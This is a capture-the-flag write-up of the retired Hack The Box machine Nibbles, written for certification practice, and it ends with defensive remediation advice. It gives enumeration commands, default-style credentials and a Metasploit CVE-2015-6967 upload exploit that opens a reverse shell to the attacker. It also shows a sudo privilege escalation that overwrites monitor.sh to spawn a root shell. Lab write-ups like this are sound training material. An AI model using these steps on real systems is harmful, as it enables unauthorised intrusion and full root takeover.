# HTB — Nibbles

> **Difficulty:** Easy · **OS:** Linux · **Status:** Retired
> **Author of writeup:** *Your Name* — written as part of preparation for the **HTB CJCA** (Certified Junior Cybersecurity Associate) certification.

---

## 📋 Summary

Nibbles is an Easy Linux box that hosts a vulnerable instance of **Nibbleblog 4.0.3**, a small CMS. The intended path is:

1. Web enumeration to discover the `/nibbleblog/` directory and its admin panel.
2. Credential discovery via an exposed `users.xml` file and a hint inside the source code.
3. Authenticated file-upload exploit (CVE-2015-6967) through the *My Image* plugin to obtain a reverse shell.
4. Privilege escalation by abusing a `sudo` rule on a writable shell script (`monitor.sh`).

---

## 🛠️ Tools used

- `nmap`
- `gobuster`
- `curl` / browser
- `metasploit` (`msfconsole`)
- `netcat`

---

## 🔎 1. Reconnaissance

### Nmap scan

```bash
nmap -sC -sV -oN nibbles.nmap <TARGET_IP>
```

Two open ports:

| Port | Service |
|------|---------|
| 22/tcp | OpenSSH |
| 80/tcp | Apache httpd |

### Browsing port 80

The homepage shows only `Hello world!`. However, the **HTML source code** reveals a hint:

```html
<!-- /nibbleblog/ directory. Nothing interesting here! -->
```

So we move on to `/nibbleblog/`.

---

## 🌐 2. Web enumeration

### Directory bruteforce with gobuster

```bash
gobuster dir -u http://<TARGET_IP>/nibbleblog/ \
  -w /usr/share/wordlists/dirb/common.txt
```

Interesting findings:

- `/nibbleblog/admin.php` — login panel
- `/nibbleblog/content/`
- `/nibbleblog/README` — exposes the CMS version: **Nibbleblog 4.0.3**

### Identifying valid credentials

Browsing `/nibbleblog/content/private/users.xml` discloses the username:

```xml
<user>
  <username>admin</username>
  ...
</user>
```

The site name and README also repeatedly mention the word **"Nibbles"**. A common beginner mistake here is to try the password as it visually appears (`Nibbles`). The CMS, however, is **case-sensitive** and the correct credentials are:

```
admin : nibbles
```

> 💡 **Lesson learned:** when a candidate password is found in source code, always try multiple case variations (`Nibbles`, `nibbles`, `NIBBLES`) — or better, feed them to `hydra` against the login form.

---

## 💥 3. Initial foothold — CVE-2015-6967

Nibbleblog **4.0.3** is affected by an authenticated arbitrary file upload through the *My Image* plugin, which allows uploading a `.php` payload that is then executed.

### Exploitation with Metasploit

```bash
msfconsole
use exploit/multi/http/nibbleblog_file_upload
set RHOSTS <TARGET_IP>
set USERNAME admin
set PASSWORD nibbles
set TARGETURI /nibbleblog
set LHOST <TUN0_IP>
run
```

> ⚠️ **Common pitfall:** the `TARGETURI` must be the **base directory of the CMS** (`/nibbleblog`), **not** the full path to the admin panel (`/nibbleblog/admin.php`). Setting it incorrectly results in the exploit failing with no obvious error.

A Meterpreter session opens as the user **`nibbler`**, and `user.txt` is in `/home/nibbler/`.

---

## ⬆️ 4. Privilege escalation

After getting a stable shell:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Check sudo privileges:

```bash
sudo -l
```

Output:

```
User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
```

We can run `monitor.sh` as **root with no password**, but the directory does not yet exist. We can simply create it:

```bash
cd /home/nibbler
unzip personal.zip                # if the archive exists
# or recreate the path manually
mkdir -p /home/nibbler/personal/stuff
```

Then replace `monitor.sh` with a payload that spawns a root shell:

```bash
echo '#!/bin/bash' > /home/nibbler/personal/stuff/monitor.sh
echo '/bin/bash -p' >> /home/nibbler/personal/stuff/monitor.sh
chmod +x /home/nibbler/personal/stuff/monitor.sh
```

Finally:

```bash
sudo /home/nibbler/personal/stuff/monitor.sh
```

Result: a shell as **root**. `root.txt` is in `/root/`.

---

## 🧠 Key takeaways

| Lesson | Why it matters |
|--------|----------------|
| Always check HTML source for hidden hints | The `/nibbleblog/` path was only mentioned in a comment. |
| Try multiple case variations for guessed passwords | `Nibbles` vs `nibbles` — case sensitivity is a classic trap. |
| Understand exploit parameters | `TARGETURI` must point to the application root, not to a specific page. |
| Always run `sudo -l` after gaining a shell | The single most impactful command for Linux privilege escalation on easy boxes. |
| `NOPASSWD` on a user-writable script = instant root | Misconfigured `sudo` rules are extremely common in real environments too. |

---

## 🛡️ Remediation recommendations (defensive view)

Because Nibbles maps cleanly to skills tested by HTB **CJCA**, here is how a defender / junior analyst would write the fix-up:

- **Patch / replace Nibbleblog** — version 4.0.3 is end-of-life and unsupported.
- **Restrict directory listing** on Apache (`Options -Indexes`) so files like `users.xml` are not exposed.
- **Remove banner information** (`ServerTokens Prod`, `ServerSignature Off`).
- **Enforce strong, unique admin passwords** and disable default accounts.
- **Audit `sudo` rules** — never grant `NOPASSWD` on scripts that the user can modify or whose parent directories the user controls.
- **Monitor file uploads** in SIEM (e.g. Elastic): alert on `.php` files appearing in CMS plugin directories.

---

## 📚 References

- Nibbleblog **CVE-2015-6967** — Arbitrary File Upload
- Metasploit module: `exploit/multi/http/nibbleblog_file_upload`
- HackTheBox — *Nibbles* (retired machine)
- HTB Academy — *Getting Started* module

---

*This writeup is published in accordance with Hack The Box's [Streaming, Writeups & Walkthrough Guidelines](https://help.hackthebox.com/en/articles/5188925-streaming-writeups-walkthrough-guidelines). Nibbles is a **retired** machine, so publishing solutions is permitted. No flags are included.*
